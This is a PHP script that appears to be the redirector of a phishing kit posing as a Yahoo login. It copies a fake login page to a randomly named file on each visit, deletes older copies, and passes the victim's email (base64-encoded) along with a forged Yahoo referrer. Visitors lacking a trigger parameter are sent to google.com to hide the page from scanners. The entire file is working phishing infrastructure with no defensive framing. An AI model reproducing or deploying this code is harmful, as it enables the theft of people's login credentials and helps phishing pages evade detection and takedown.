<?php
session_start();
?>
<?php
 
$x = $_GET['i'];
$files = glob("*zt.php");
foreach($files as $file)
unlink($file);
copy("main.php","ogin.php");
function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($login, $find);
$loginID = substr($login, 0, $pos);
return $loginID;
}
$login = base64_encode($_GET['0']);
$loginID = getloginIDFromlogin($login);
$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "ogin.php");
}}}
$staticfile = "ogin.php";
$name =  generateRandomString();
$secfile = $name."zt.php";
if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
}else {
if(file_exists($secfile)){
//echo "file exist\n";
unlink($staticfile);
if($x !== "i"){
	header("Location: http://google.com");
}

else{
header("Location: $secfile?0=$login&.verify??guce_referrer=aHR0cHM6Ly9sb2dpbi55YWhvby5jb20v&guce_referrer_sig=AQAAABA99NmGR9iNQOyU5mI3ASjQfYjcPATD_A8modgjxpNXYNmo8n5zxdi8EZV7GFYPzoSc_RpMz0hYfdCk0OLmxnMB6tpfZnd5ENcxTcI3e56K0Vz3pSL6PoIoDveE6VV6vAiBzqdjcYAbAHdiaf7gx2w9XRGmCh4orbe2VcZO9aN_");
}}
}
//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>